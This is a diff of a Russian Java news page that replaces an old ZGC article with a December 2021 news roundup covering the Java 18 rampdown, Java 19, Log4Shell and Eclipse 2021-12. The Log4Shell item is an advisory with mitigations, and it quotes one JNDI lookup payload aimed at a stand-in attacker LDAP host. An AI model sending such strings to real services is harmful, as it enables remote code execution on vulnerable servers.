@@ -1,25 +1,25 @@
 <!doctype html>
 <html>
   <head>
-    <title>В Oracle разрабатывают новый сборщик мусора ZGC</title>
+    <title>Новости Java #34</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta property="og:type" content="article">
-    <meta property="og:title" content="В Oracle разрабатывают новый сборщик мусора ZGC">
-    <meta property="og:description" content="Вчера появилась новость о разработке внутри Oracle нового сборщика мусора Z Garbage Collector (ZGC)&hellip;">
+    <meta property="og:title" content="Новости Java #34">
+    <meta property="og:description" content="&bull; Java 18 перешла в первую фазу Rampdown: главный репозиторий JDK был ответвлён в стабилизационный репозиторий JDK 18, и новых JEP'ов в этом релизе больше не будет&hellip;">
     <meta property="og:site_name" content="miniJUG">
-    <meta property="article:published_time" content="2017-10-27">
+    <meta property="article:published_time" content="2021-12-13">
     <meta property="article:author" content="miniJUG">
     <meta property="article:author_url" content="https://twitter.com/mini_JUG">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:creator" content="@mini_JUG">
-    <meta name="twitter:title" content="В Oracle разрабатывают новый сборщик мусора ZGC">
-    <meta name="twitter:description" content="Вчера появилась новость о разработке внутри Oracle нового сборщика мусора Z Garbage Collector (ZGC)&hellip;">
+    <meta name="twitter:title" content="Новости Java #34">
+    <meta name="twitter:description" content="&bull; Java 18 перешла в первую фазу Rampdown: главный репозиторий JDK был ответвлён в стабилизационный репозиторий JDK 18, и новых JEP'ов в этом релизе больше не будет&hellip;">
     <meta name="telegram:channel" content="@miniJUG">
-    <meta property="og:image" content="https://minijug.ru/minijug.png">
+    <meta property="og:image" content="https://minijug.ru/java_news_34.png">
     <meta property="og:image:width" content="1269">
     <meta property="og:image:height" content="664">
-    <meta name="twitter:image" content="https://minijug.ru/minijug.png">
+    <meta name="twitter:image" content="https://minijug.ru/java_news_34.png">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
     <link rel="icon" href="/favicon16.png" type="image/png" sizes="16x16">
@@ -31,22 +31,41 @@
     <div class="container">
       <div class="row">
         <div class="p-lg-4 p-3 bg-white rounded col-lg-8" style="font-size: 1.15rem">
-<h3 id="title">В Oracle разрабатывают новый сборщик мусора ZGC</h3>
-<p class="text-secondary"><time datetime="2017-10-27">27 октября, 2017</time></p>
+<h3 id="title">Новости Java #34</h3>
+<p class="text-secondary"><time datetime="2021-12-13">13 декабря, 2021</time></p>
 <article>
-<p>Вчера появилась <a href="http://mail.openjdk.java.net/pipermail/announce/2017-October/000237.html">новость</a> о разработке внутри Oracle нового сборщика мусора Z Garbage Collector (ZGC).</p>
-<p>ZGC нацелен на маленькие паузы (< 10мс) и большие кучи (> 1TB), при этом понижение производительности не должно превышать 15%. Как утверждает лидер проекта Per Liden, реализация уже достаточна зрелая и стабильная.</p>
-<p>Сейчас происходит процедура голосования за утверждение ZGC как проекта OpenJDK, после которой исходники нового сборщика мусора станут доступны сообществу.</p>
-<p>Тем временем, сообщество восприняло новость неоднозначно. Сборщик мусора с ультрамаленькими паузами, безусловно, нужен, но многие выразили недоумение, так как разработка подобного сборщика мусора уже ведётся в другом проекте Shenandoah (<a href="http://openjdk.java.net/jeps/189">JEP 189</a>). В частности, Volker Simonis из SAP <a href="http://mail.openjdk.java.net/pipermail/discuss/2017-October/004540.html">выразил</a> своё беспокойство по поводу дублирования усилий разными командами (RedHat инвестировал в Shenandoah большие ресурсы), а так же факта, что процедуру голосования начали без предварительной публичной дискуссии. Кроме того, наличие двух сборщиков мусоров, делающих примерно то же самое, немного сбивает с толку. Какой из них лучше? Какой в итоге останется в OpenJDK или останутся оба?</p>
-<p>С другой стороны, некоторым не терпится как можно быстрее посмотреть код ZGC и пощупать сборщик мусора в действии.</p>
+<p>&bull; Java 18 перешла в <a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-December/006287.html">первую фазу Rampdown</a>: главный репозиторий JDK был ответвлён в <a href="https://github.com/openjdk/jdk18">стабилизационный репозиторий JDK 18</a>, и новых JEP'ов в этом релизе больше не будет.</p>
+<p>Одновременно с этим началась <a href="https://bugs.openjdk.java.net/browse/JDK-8273146">разработка Java 19</a>. У нового релиза появилась <a href="https://jdk.java.net/19/">своя страница</a>, где уже доступна для скачивания первая ранняя сборка JDK 19-ea+1.</p>
+
+<p class="pt-2">&bull; В популярной библиотеке логирования Apache Log4J 2.x обнаружили <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">серьёзную уязвимость</a>, позволяющую выполнить на уязвимом сервере произвольный код. Уязвимость может быть эксплуатирована, если Log4J используется для параметризированного логирования непроверенного текста, приходящего от пользователя, например:</p>
+<pre class="border p-lg-2 p-1">log.info(<span style="color: darkred">"Сообщение от пользователя: {}"</span>, userMsg);</pre>
+<p>Злоумышленник может воспользоваться этим и послать строку специального вида (<code class="text-nowrap">${jndi:ldap://attacker.com/a}</code>), которую обработает Log4J и загрузит через JNDI вредоносный класс с LDAP-сервера, контролируемого злоумышленником. Класс будет инъектирован в Java-процесс, что позволит атакующему выполнить произвольный код с правами пользователя, от лица которого запущен процесс.</p>
+<p>Так как Apache Log4J является одной из двух самых популярных библиотек логирования в Java (наряду с Logback), то такая уязвимость поставила под угрозу огромное количество сервисов по всему миру, включая крупнейших.</p>
+<p>Наиболее надёжным способом защиты от Log4Shell (такое народное название дали этой уязвимости) является обновление Log4J до версии <a href="https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom">2.15.0</a>. Также решением является установка системного свойства <code class="text-nowrap">log4j2.formatMsgNoLookups=true</code>, однако оно работает только для версий Log4J <code class="text-nowrap">2.10.0</code> и выше. Кроме того, можно полностью удалить class-файл <code class="text-nowrap">org/apache/logging/log4j/core/lookup/JndiLookup.class</code> из библиотеки.</p>
+<p>Уязвимости меньше подвержены <a href="https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797">новые версии Java</a> (8u191+, 11.0.1+, 13, 15, 17), однако они не защищены от всех возможных векторов атаки, поэтому полагаться на такую защиту крайне нежелательно и настоятельно рекомендуется предпринять один из вышеописанных шагов.</p>
+
+<p class="pt-2">&bull; Вышел <a href="https://www.youtube.com/watch?v=3W9bvidcO20">Eclipse 2021-12</a> со следующими нововведениями:</p>
+<ul>
+  <li>Поддержка разработки на Java 17</li>
+  <li>Новое действие "Convert String concatenation to Text Block"</li>
+  <li>Возможность помечать объекты меткой в режиме отладки</li>
+  <li>Умная вставка текста в поле диалога Open Type (обрезание лишнего)</li>
+  <li>Новый редактор POM с возможностью автодополнения по имени артефакта/плагина и выбором из выпадающего списка версий</li>
+  <li>Новое view "Launch Configurations"</li>
+  <li>Мультикурсоры (одновременное редактирование в нескольких частях файла)</li>
+  <li>Открывание ссылок во внешнем браузере вместо внутреннего</li>
+  <li>Улучшения в тёмной теме</li>
+  <li>Улучшение времени старта IDE</li>
+  <li>Улучшения в EGit и JS-редакторе</li>
+</ul>
 </article>
   <p class="pt-4 font-italic">Подписывайтесь на <a href="https://t.me/miniJUG">канал в Telegram</a>, чтобы не пропускать новости.</p>
 </div>
 <div class="pl-4 pt-5 col-lg-4">
 <div class="mt-3">
-  <a class="dropdown-toggle text-body" data-toggle="collapse" href="#year2021" role="button" aria-expanded="false" aria-controls="year2021">2021</a>
-  <ul class="collapse" id="year2021">
-<li class="text-secondary"><a href="java_news_34.html" class="text-secondary">Новости Java #34</a></li>
+  <a class="dropdown-toggle text-body" data-toggle="collapse" href="#year2021" role="button" aria-expanded="true" aria-controls="year2021">2021</a>
+  <ul class="collapse show" id="year2021">
+<li>Новости Java #34</li>
 <li class="text-secondary"><a href="java_news_33.html" class="text-secondary">Новости Java #33</a></li>
 <li class="text-secondary"><a href="java_news_32.html" class="text-secondary">Новости Java #32</a></li>
 <li class="text-secondary"><a href="java_news_31.html" class="text-secondary">Новости Java #31</a></li>
@@ -133,8 +152,8 @@
   </ul>
 </div>
 <div class="mt-3">
-  <a class="dropdown-toggle text-body" data-toggle="collapse" href="#year2017" role="button" aria-expanded="true" aria-controls="year2017">2017</a>
-  <ul class="collapse show" id="year2017">
+  <a class="dropdown-toggle text-body" data-toggle="collapse" href="#year2017" role="button" aria-expanded="false" aria-controls="year2017">2017</a>
+  <ul class="collapse" id="year2017">
 <li class="text-secondary"><a href="var_in_lambdas.html" class="text-secondary">В лямбдах можно будет использовать <code>var</code></a></li>
 <li class="text-secondary"><a href="http_client.html" class="text-secondary">В Java появится стандартный HTTP-клиент</a></li>
 <li class="text-secondary"><a href="nestmates.html" class="text-secondary">В Java исчезнет необходимость в генерации синтетических методов доступа между вложенными типами</a></li>
@@ -150,7 +169,7 @@
 <li class="text-secondary"><a href="new_java_version_proposal.html" class="text-secondary">Java всё-таки не будет версионироваться годом и месяцем выхода релизов</a></li>
 <li class="text-secondary"><a href="java_18_3.html" class="text-secondary">Java переходит на 6-месячный релизный цикл и меняет схему версионирования</a></li>
 <li class="text-secondary"><a href="project_loom.html" class="text-secondary">В Java появятся легковесные нити и корутины</a></li>
-<li>В Oracle разрабатывают новый сборщик мусора ZGC</li>
+<li class="text-secondary"><a href="zgc.html" class="text-secondary">В Oracle разрабатывают новый сборщик мусора ZGC</a></li>
   </ul>
 </div>
 </div>
